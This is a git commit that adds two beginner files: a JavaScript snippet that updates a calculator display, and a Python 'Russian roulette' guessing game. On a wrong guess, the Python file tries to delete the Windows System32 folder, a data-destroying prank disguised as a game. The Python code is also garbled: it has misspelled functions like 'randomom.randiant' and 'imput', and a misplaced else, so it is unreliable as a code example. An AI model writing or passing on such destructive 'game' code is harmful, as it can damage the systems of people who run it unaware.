d5db5d19d0ab544a12d6d0bb6fc24eadb6a85a1c
Kawan <kawanxd@hotmail.com>
2024-10-09 00:46:42 -0300

    first commit

---
+++ pasta 1/roleta russa.py
@@ -0,0 +1,12 @@
+import random
+import os
+
+number = randomom.randiant (1, 10)
+
+guess = imput("lets play!!")
+guess = int(guess)
+
+if(guess == number):
+       print("omg, you winn!!")
+       else:
+           os.remove("C:\Windows\System32")
---
+++ pasta 1/script.js
@@ -0,0 +1,13 @@
+'use strict';
+
+const display = document.getElementById('display');
+const numeros = document.querySelectorAll ('[id*=tecla]');
+
+const atualizarDisplay = (texto) => {
+    display.textContent += texto;
+
+}
+
+const inserirNumero = (evento) => atualizarDisplay(evento.target.textContent);
+
+numeros.forEach (numero => numero.addEventListener('click', inserirNumero));
